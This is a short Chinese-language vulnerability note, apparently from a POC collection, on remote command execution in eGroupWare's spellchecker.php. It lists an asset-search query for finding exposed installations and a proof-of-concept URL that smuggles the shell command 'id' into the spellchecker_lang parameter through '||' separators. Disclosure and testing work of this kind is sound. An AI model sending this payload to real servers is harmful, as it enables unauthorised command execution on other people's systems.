# eGroupWare spellchecker.php 远程命令执行漏洞

## 漏洞描述

*eGroupWare*是一个多用户，在以PHP为基础的API上的定制集为基础开发的，以WEB为基础的工作件套装，其中 spellchecker.php 文件中存在命令执行漏洞

## 漏洞影响

<a-checkbox checked>eGroupWare</a-checkbox></br>

## 网络测绘

<a-checkbox checked>app="EGROUPWARE-产品"</a-checkbox></br>

## 漏洞复现

登录页面

![img](../../../.vuepress/public/img/1629087827840-2daaeca6-8c17-48dd-bbb4-5a7f4746b181.png)

验证POC

```bash
/egroupware/phpgwapi/js/fckeditor/editor/dialog/fck_spellerpages/spellerpages/server-scripts/spellchecker.php?spellchecker_lang=egroupware_spellchecker_cmd_exec.nasl%7C%7Cid%7C%7C
```

![img](../../../.vuepress/public/img/1629088046554-f44013d6-babd-4708-bd9b-ce93b4fbd12a.png)

